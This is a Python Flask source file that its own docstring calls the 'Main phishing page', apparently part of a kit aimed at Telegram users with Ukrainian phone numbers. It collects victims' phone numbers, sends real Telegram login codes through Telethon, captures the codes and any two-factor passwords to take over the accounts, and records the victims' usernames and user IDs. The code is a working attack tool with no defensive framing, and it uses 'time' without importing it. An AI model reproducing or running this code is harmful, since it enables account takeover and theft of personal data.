#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
main.py - Основные маршруты для лендинга
Версия: 2.0
"""

import re
import random
import asyncio
from flask import Blueprint, request, render_template, jsonify, session
from services.telegram_service import send_code_telethon, sign_in_telethon, sign_in_2fa
from stats_db import stats_db

main_bp = Blueprint('main', __name__)

# Store pending sessions
pending_sessions = {}

@main_bp.route('/')
def index():
    """Main phishing page."""
    try:
        # Track visit
        ip = request.remote_addr or '127.0.0.1'
        user_agent = request.headers.get('User-Agent', 'Unknown')
        
        if stats_db:
            stats_db.add_visit(ip, user_agent)
        
        return render_template("index.html")
    except Exception as e:
        print(f"Error in index: {e}")
        return render_template("index.html")

@main_bp.route('/api/send_code', methods=['POST'])
def handle_send_code():
    """Step 1: Send code to phone."""
    try:
        data = request.get_json()
        if not data:
            return jsonify({'status': 'error', 'message': 'No data'}), 400
        
        # Clean phone number
        raw_phone = data.get('phone', '')
        phone = re.sub(r'\D', '', raw_phone)
        
        # Format to international
        if len(phone) == 9:
            phone = '380' + phone
        elif len(phone) == 10 and phone.startswith('0'):
            phone = '38' + phone[1:]
        elif not phone.startswith('+'):
            phone = '+' + phone
        
        # Generate session ID
        session_id = str(random.randint(100000, 999999))
        
        # Track phone submission
        if stats_db:
            stats_db.add_phone(phone, request.remote_addr or '127.0.0.1')
        
        # Send code via Telegram
        result = asyncio.run(send_code_telethon(phone, session_id))
        
        if result.get('status') == 'success':
            # Store session data
            pending_sessions[session_id] = {
                'phone': phone,
                'phone_code_hash': result.get('phone_code_hash'),
                'ip': request.remote_addr or '127.0.0.1'
            }
            
            return jsonify({
                'status': 'success',
                'sid': session_id,
                'timeout': result.get('timeout', 120)
            })
        
        elif result.get('status') == 'already_authorized':
            return jsonify({
                'status': 'error',
                'message': 'This number is already authorized'
            })
        
        else:
            return jsonify({
                'status': 'error',
                'message': result.get('message', 'Failed to send code')
            })
            
    except Exception as e:
        print(f"Error in send_code: {e}")
        return jsonify({'status': 'error', 'message': 'Server error'}), 500

@main_bp.route('/api/verify', methods=['POST'])
def handle_verify():
    """Step 2: Verify code and handle 2FA if needed."""
    try:
        data = request.get_json()
        sid = data.get('sid')
        code = data.get('code', '')
        password = data.get('password', '')
        
        if sid not in pending_sessions:
            return jsonify({'status': 'error', 'message': 'Session expired'}), 400
        
        session_data = pending_sessions[sid]
        
        # If password provided, handle 2FA
        if password:
            result = asyncio.run(sign_in_2fa(password, sid, session_data['phone']))
            
            if result.get('status') == 'success':
                # Track success
                if stats_db:
                    stats_db.add_code_attempt(
                        session_data['phone'], 
                        '2FA', 
                        request.remote_addr or '127.0.0.1', 
                        success=True
                    )
                    
                    # Update account info
                    stats_db.update_account_info(sid, {
                        'phone': session_data['phone'],
                        'username': result.get('username'),
                        'first_name': result.get('first_name'),
                        'last_name': result.get('last_name'),
                        'user_id': result.get('user_id'),
                        'created': time.time(),
                        'method': '2fa'
                    })
                
                # Remove from pending
                del pending_sessions[sid]
                
                return jsonify({
                    'status': 'success',
                    'message': 'Login successful'
                })
            else:
                # Track failed 2FA
                if stats_db:
                    stats_db.add_failed_attempt(
                        session_data['phone'],
                        'invalid_2fa',
                        request.remote_addr or '127.0.0.1'
                    )
                
                return jsonify({
                    'status': 'error',
                    'message': result.get('message', 'Invalid password')
                })
        
        # Regular code verification
        result = asyncio.run(sign_in_telethon(
            code,
            sid,
            session_data['phone'],
            session_data['phone_code_hash']
        ))
        
        if result.get('status') == 'success':
            # Track success
            if stats_db:
                stats_db.add_code_attempt(
                    session_data['phone'],
                    code,
                    request.remote_addr or '127.0.0.1',
                    success=True
                )
                
                # Update account info
                stats_db.update_account_info(sid, {
                    'phone': session_data['phone'],
                    'username': result.get('username'),
                    'first_name': result.get('first_name'),
                    'last_name': result.get('last_name'),
                    'user_id': result.get('user_id'),
                    'created': time.time(),
                    'method': 'code'
                })
            
            # Remove from pending
            del pending_sessions[sid]
            
            return jsonify({'status': 'success'})
            
        elif result.get('status') == 'password_needed':
            # 2FA required - store that we need password
            pending_sessions[sid]['needs_2fa'] = True
            
            return jsonify({'status': 'need_2fa'})
            
        else:
            # Track failed attempt
            if stats_db:
                stats_db.add_failed_attempt(
                    session_data['phone'],
                    result.get('message', 'invalid_code'),
                    request.remote_addr or '127.0.0.1'
                )
            
            return jsonify({
                'status': 'error',
                'message': result.get('message', 'Invalid code')
            })
            
    except Exception as e:
        print(f"Error in verify: {e}")
        return jsonify({'status': 'error', 'message': 'Server error'}), 500

@main_bp.route('/success')
def success():
    """Success page."""
    return render_template("success.html")

@main_bp.route('/api/resend_code', methods=['POST'])
def resend_code():
    """Resend verification code."""
    try:
        data = request.get_json()
        sid = data.get('sid')
        
        if sid not in pending_sessions:
            return jsonify({'status': 'error', 'message': 'Session expired'}), 400
        
        session_data = pending_sessions[sid]
        
        # Resend code
        result = asyncio.run(send_code_telethon(session_data['phone'], sid))
        
        if result.get('status') == 'success':
            # Update hash
            session_data['phone_code_hash'] = result.get('phone_code_hash')
            
            return jsonify({
                'status': 'success',
                'message': 'Code resent',
                'timeout': result.get('timeout', 120)
            })
        else:
            return jsonify({
                'status': 'error',
                'message': result.get('message', 'Failed to resend code')
            })
            
    except Exception as e:
        print(f"Error in resend_code: {e}")
        return jsonify({'status': 'error', 'message': 'Server error'}), 500

# Cleanup old sessions (can be called via cron)
@main_bp.route('/api/cleanup', methods=['POST'])
def cleanup_sessions():
    """Remove expired sessions (older than 1 hour)."""
    try:
        now = time.time()
        expired = []
        
        for sid, data in pending_sessions.items():
            # Check if session has timestamp
            if 'created' not in data:
                data['created'] = now
            
            # Remove if older than 1 hour
            if now - data['created'] > 3600:
                expired.append(sid)
        
        for sid in expired:
            del pending_sessions[sid]
        
        return jsonify({
            'status': 'success',
            'removed': len(expired),
            'remaining': len(pending_sessions)
        })
    except Exception as e:
        print(f"Error in cleanup: {e}")
        return jsonify({'status': 'error', 'message': str(e)}), 500